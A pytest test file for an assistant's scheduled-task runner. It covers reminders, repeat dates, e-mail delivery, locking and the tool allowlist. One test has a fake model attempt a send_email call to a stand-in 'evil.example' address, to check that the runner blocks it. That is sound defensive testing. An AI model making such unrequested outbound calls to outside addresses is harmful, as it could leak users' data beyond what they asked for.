"""Scheduled tasks: adding, listing, cancelling, and the runner with a fake model (no Ollama)."""

import datetime as dt
import fcntl
import importlib
import json
import sys
from pathlib import Path

import httpx
import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "toolbox"))


@pytest.fixture()
def sch(tmp_path, monkeypatch):
    monkeypatch.setenv("SCHEDULE_FILE", str(tmp_path / "schedule.json"))
    monkeypatch.setenv("WORKSPACE", str(tmp_path / "ws"))
    monkeypatch.setenv("WARM_DIR", str(tmp_path / "warm"))
    monkeypatch.setenv("EMAIL_ENV_FILE", str(tmp_path / "none.env"))
    monkeypatch.setenv("EMAIL_PROVIDER", "resend")
    monkeypatch.setenv("EMAIL_API_KEY", "re_x")
    monkeypatch.setenv("EMAIL_ALLOWED_TO", "me@gmail.com")
    import emailer
    import scheduler

    emailer = importlib.reload(emailer)
    sent = []
    monkeypatch.setattr(
        emailer, "send", lambda to, subject, body, attachments, **k: sent.append((to, subject, body)) or "sent"
    )
    s = importlib.reload(scheduler)
    s._sent = sent
    return s


def at(s, minutes):
    return (s.now() + dt.timedelta(minutes=minutes)).strftime("%Y-%m-%d %H:%M")


def test_add_list_cancel(sch):
    out = sch.add(at(sch, 30), "Pay the credit card", kind="reminder")
    assert "Scheduled reminder" in out and "once" in out and "e-mailed to you" in out
    out2 = sch.add(at(sch, 60), "Weather for today and my calendar", repeat="weekdays")
    assert "every weekday" in out2
    listing = sch.listing()
    assert "reminder, once" in listing and "task, weekdays" in listing
    ident = out.split("[id ")[1].split("]")[0]
    assert "Cancelled" in sch.cancel(ident) and "Pay the credit card" not in sch.listing()
    assert "in the past" in sch.add("2020-01-01 09:00", "x")
    assert "repeat must be" in sch.add(at(sch, 5), "x", repeat="fortnightly")
    assert "Can't read the time" in str(pytest.raises(ValueError, sch.add, "tomorrow", "x").value)


def test_repeats_land_on_the_right_days(sch):
    fri = dt.datetime(2026, 10, 16, 7, 0).astimezone()
    assert sch.next_after(fri, "weekdays").weekday() == 0  # Friday -> Monday
    jan31 = dt.datetime(2027, 1, 31, 8, 0).astimezone()
    assert sch.next_after(jan31, "monthly").date() == dt.date(2027, 2, 28)
    assert sch.next_after(fri, "") is None


def test_a_due_reminder_is_emailed_saved_and_not_repeated(sch, tmp_path):
    sch.add(at(sch, 1), "Call the dentist", kind="reminder")
    jobs = sch.load()
    jobs[0]["next_run"] = (sch.now() - dt.timedelta(minutes=1)).isoformat()  # now due
    sch.save(jobs)
    done = sch.run_due()
    assert done and "e-mailed and saved" in done[0]
    to, subject, body = sch._sent[0]
    assert to == ["me@gmail.com"] and subject == "Reminder: Call the dentist" and body.startswith("Call the dentist")
    assert list((tmp_path / "ws" / "scheduled").glob("*.md"))
    assert not sch.load()[0]["active"] and sch.run_due() == []  # once: done


def test_a_task_is_done_by_the_assistant_with_safe_tools_only(sch, monkeypatch):
    sch.add(at(sch, 1), "Tell me today's date", repeat="daily")
    jobs = sch.load()
    first = jobs[0]["next_run"]
    jobs[0]["next_run"] = (sch.now() - dt.timedelta(minutes=2)).isoformat()
    sch.save(jobs)
    bodies = []

    def model(body):
        bodies.append(body)
        names = {t["function"]["name"] for t in body["tools"]}
        assert "send_email" not in names and "schedule_task" not in names and "current_datetime" in names
        assert (
            "SCHEDULED task" in body["messages"][0]["content"]
            and "{{current_date}}" not in body["messages"][0]["content"]
        )
        step = len(bodies)
        if step == 1:
            msg = {"role": "assistant", "content": "", "tool_calls": [
                {"function": {"name": "current_datetime", "arguments": {}}},
                {"function": {"name": "send_email", "arguments": {"to": "x@evil.example", "body": "hi"}}}]}  # fmt: skip
        else:
            assert "not available in a scheduled task" in json.dumps(body["messages"])
            msg = {"role": "assistant", "content": "Today is the day you asked about."}
        return httpx.Response(200, json={"message": msg}, request=httpx.Request("POST", "http://ollama"))

    warmed = []
    import warmup

    monkeypatch.setattr(warmup, "warm_up", lambda *a, **k: warmed.append(1) or [])
    done = sch.run_due(post=model)
    assert "e-mailed" in done[0] and sch._sent[0][2].startswith("Today is the day you asked about.")
    job = sch.load()[0]
    assert job["active"] and job["next_run"] > sch.now().isoformat() and job["runs"] == 1 and first
    assert warmed  # the Assistant's instructions are read again after the run


def test_only_one_runner_at_a_time(sch):
    sch.SCHEDULE_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(sch.SCHEDULE_FILE.with_suffix(".lock"), "w") as held:
        fcntl.flock(held, fcntl.LOCK_EX)
        assert sch.run_due() == []


def test_tools_are_in_the_toolbox(tmp_path, monkeypatch):
    monkeypatch.setenv("SCHEDULE_FILE", str(tmp_path / "s.json"))
    import scheduler
    import toolbox_server

    importlib.reload(scheduler)
    tb = importlib.reload(toolbox_server)
    when = (dt.datetime.now() + dt.timedelta(days=1)).strftime("%Y-%m-%d 07:00")
    assert "Scheduled task" in tb.schedule_task(when, "Weather and my day", "daily")
    assert "task, daily" in tb.scheduled_tasks()
    assert "No active scheduled task" in tb.cancel_scheduled_task("nope")


def test_allowlist_default(sch):
    allowed = sch.allowed_tools()
    assert "read_file" in allowed and "web_search" in allowed
    assert "send_email" not in allowed and "run_python" not in allowed and "publish_story" not in allowed


def test_allowlist_extra_trimmed(sch, monkeypatch):
    monkeypatch.setenv("SCHEDULER_ALLOW_EXTRA", " publish_story , x")
    allowed = sch.allowed_tools()
    assert "publish_story" in allowed and "x" in allowed


def test_allowlist_deny_removes(sch, monkeypatch):
    monkeypatch.setenv("SCHEDULER_DENY_TOOLS", "read_file")
    assert "read_file" not in sch.allowed_tools()


def test_allowlist_replaces_default(sch, monkeypatch):
    monkeypatch.setenv("SCHEDULER_ALLOW_TOOLS", "read_file")
    allowed = sch.allowed_tools()
    assert "read_file" in allowed and "web_search" not in allowed
